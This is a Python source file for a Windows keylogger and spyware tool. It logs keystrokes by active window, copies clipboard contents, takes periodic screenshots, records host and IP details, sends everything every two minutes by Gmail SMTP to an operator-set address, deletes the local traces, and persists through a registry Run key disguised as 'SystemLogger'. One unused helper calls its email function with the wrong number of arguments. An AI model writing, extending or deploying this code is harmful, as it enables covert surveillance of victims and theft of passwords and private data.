import os
import time
import socket
import platform
import smtplib
import win32clipboard
import threading
import pygetwindow as gw
import winreg as reg
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# File paths
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

# Email configuration
email_address = " "  # This email address is the one that will send the email
password = " "  # Password of the email address
toaddr = " "  # This email address is the one that will receive the email

# File storage path
file_path = os.path.dirname(os.path.abspath(__file__))
file_merge = file_path + os.sep

# Function to collect system information
def computer_information():
    with open(file_merge + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        public_ip = get("https://api.ipify.org").text
        f.write(f"Public IP Address: {public_ip}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {IPAddr}\n")

# Function to copy clipboard content
def copy_clipboard():
    with open(file_merge + clipboard_information, "w") as f:
        win32clipboard.OpenClipboard()
        f.write("Clipboard Data:\n" + win32clipboard.GetClipboardData())
        win32clipboard.CloseClipboard()

# Function to take a screenshot
def screenshot():
    ImageGrab.grab().save(file_merge + screenshot_information)

# Periodic screenshot function
def periodic_screenshot(interval=60):
    while True:
        screenshot()
        time.sleep(interval)

# Function to get active window title
def get_active_window():
    try:
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"
    except:
        return "Unknown Window"
    
# Function to send an email with multiple attachments
def send_email(files, toaddr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Log Files"
    msg.attach(MIMEText("All collected files.", 'plain'))

# Attach all files
    for file in files:
        file_path = file_merge + file
        if os.path.exists(file_path):  # Verifies that the file exists before attaching it
            with open(file_path, 'rb') as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f"attachment; filename={file}")
                msg.attach(p)

# Send email
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, toaddr, msg.as_string())
    s.quit()

# Keylogger functions
keys = []
last_window = None  # Variable to track the last active window

def write_file(keys):
    global last_window
    with open(file_merge + keys_information, "a") as f:
        active_window = get_active_window()
        if active_window != last_window:
            f.write(f"\n[{active_window}]\n")  # Only add when window changes
            last_window = active_window
        
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write(' ')
            elif "Key" not in k:
                f.write(k)

def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 1:
        write_file(keys)
        keys = []

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to add the program to Windows startup
def add_to_startup():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
        reg.SetValueEx(key, "SystemLogger", 0, reg.REG_SZ, os.path.abspath(__file__))

def send_and_delete_files():
    for file in [keys_information, system_information, clipboard_information, screenshot_information]:
        try:
            send_email(file, file_merge + file, toaddr)
            os.remove(file_merge + file)
        except:
            pass  # Prevents the program from stopping if there is an error

# Main execution loop
if __name__ == "__main__":
   # Start the keylogger in a separate thread
    listener_thread = threading.Thread(target=start_keylogger)
    listener_thread.start()

    # Start periodic screenshot thread
    threading.Thread(target=periodic_screenshot, daemon=True).start()

    # Run the rest of the functions in the main thread
    while True:
        # Step 1: Collect system info and clipboard content
        computer_information()
        copy_clipboard()

        # Step 2: Send all collected files in a single email
        files_to_send = [keys_information, system_information, clipboard_information, screenshot_information]
        send_email(files_to_send, toaddr)

        # Step 3: Delete the files after sending
        for file in files_to_send:
            os.remove(file_merge + file)

        # Step 4: Wait before next iteration
        time.sleep(120)  # Adjust the time interval for the next cycle (in seconds)